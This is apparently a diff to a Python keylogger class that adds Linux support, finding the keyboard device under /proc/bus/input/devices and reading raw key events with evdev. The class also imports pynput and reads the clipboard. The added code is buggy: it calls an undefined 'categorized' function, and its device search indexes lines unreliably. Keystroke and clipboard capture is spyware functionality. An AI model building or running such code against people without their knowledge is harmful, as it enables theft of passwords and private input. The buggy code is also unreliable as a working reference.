@@ -9,6 +9,7 @@ import threading
 import time
 import subprocess
 import clipboard
+from evdev import InputDevice, categorize, ecodes
 from pynput.keyboard import Listener
 
 class KeyLogger:
@@ -25,6 +26,31 @@ class KeyLogger:
 
         self.clipboard_content = clipboard.paste()
         #schat.chat(user_input="role:HELP_ROLE:", suppress=True, run=True)
+
+    def linux_find_keyboard_device(self):
+        ''' Find keyboard device for linux '''
+        with open("/proc/bus/input/devices") as f:
+            lines = f.readlines()
+
+        for line in lines:
+            if "keyboard" in line.lower():
+                next_line = lines[lines.index(line) + 1]
+                event_line = ""
+                for f in lines[lines.index(next_line):]:
+                    if f.strip().startswith("H: Handlers"):
+                        event_line = f
+
+                event = event_line.strip().split("event")[1]
+                event = event.split(" ")[0]
+                return "/dev/input/event" + event
+
+    def linux_read_keys(self):
+        key_dev = self.linux_find_keyboard_device()
+        dev = InputDevice(key_dev)
+
+        for event in dev.read_loop():
+            if event.type == ecodes.EV_KEY:
+                print(categorized(event))
 
     def pull_clipboard(self):
         # Pull clipboard contents
